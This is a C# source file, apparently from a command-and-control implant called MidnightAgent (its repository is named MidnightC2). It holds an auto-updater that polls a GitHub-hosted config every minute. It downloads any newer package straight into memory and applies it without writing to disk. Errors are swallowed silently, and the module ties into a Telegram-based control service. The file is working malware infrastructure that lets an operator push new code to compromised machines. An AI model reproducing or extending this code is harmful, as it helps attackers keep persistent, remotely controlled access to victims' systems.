using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace MidnightAgent.Core
{
    /// <summary>
    /// Auto updater - checks for updates from a single remote config file
    /// Format: Line 1 = "v = X.Y.Z", Line 2 = download URL
    /// </summary>
    public static class AutoUpdater
    {
        // Single source: version + download URL in one file
        private const string UpdateConfigUrl = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/dropbox-url-update.txt";
        
        private static Timer _timer;

        public static void Start(CancellationToken token)
        {
            Logger.Log("AutoUpdater started (In-Memory)");
            
            // Check every 1 minute
            _timer = new Timer(CheckForUpdateCallback, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));
            
            token.Register(() =>
            {
                _timer?.Dispose();
                Logger.Log("AutoUpdater stopped");
            });
        }

        private static void CheckForUpdateCallback(object state)
        {
            byte[] updateZip = null;
            try
            {
                // 1. Read single config file (version + URL)
                string content = DownloadString(UpdateConfigUrl);
                if (string.IsNullOrEmpty(content)) return;

                var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                if (lines.Length < 2) return;

                // Line 1: "v = 0.6.10"
                string remoteVersion = null;
                if (lines[0].StartsWith("v = ")) remoteVersion = lines[0].Substring(4).Trim();
                if (string.IsNullOrEmpty(remoteVersion)) return;

                // Line 2: download URL
                string downloadUrl = lines[1].Trim();
                if (string.IsNullOrEmpty(downloadUrl)) return;

                // 2. Compare versions
                if (!IsNewerVersion(remoteVersion, Config.Version)) return;

                Logger.Log($"New update available: {remoteVersion}");

                // 3. Download directly to RAM
                updateZip = DownloadBytes(downloadUrl);
                if (updateZip == null || updateZip.Length == 0) return;

                // Ensure TelegramInstance is set
                if (Features.UpdateFeature.TelegramInstance == null)
                {
                    Features.UpdateFeature.TelegramInstance = new Telegram.TelegramService();
                }

                // 4. Trigger Update from RAM
                var updater = new Features.UpdateFeature();
                updater.PerformUpdateFromBytes(updateZip, remoteVersion).Wait();
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"AutoUpdate Error: {ex.Message}");
            }
            finally
            {
                // CRITICAL: Cleanup to prevent memory leaks
                updateZip = null;
                GC.Collect(2, GCCollectionMode.Forced);
            }
        }

        private static string DownloadString(string url)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Timeout = 15000;
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    return reader.ReadToEnd().Trim();
                }
            }
            catch { return null; }
        }

        private static byte[] DownloadBytes(string url)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Timeout = 30000;
                
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream responseStream = response.GetResponseStream())
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        ms.Write(buffer, 0, bytesRead);
                    }
                    return ms.ToArray();
                }
            }
            catch { return null; }
        }

        private static bool IsNewerVersion(string remote, string current)
        {
            try
            {
                var v1 = new Version(remote);
                var v2 = new Version(current);
                return v1 > v2;
            }
            catch { return false; }
        }
    }
}
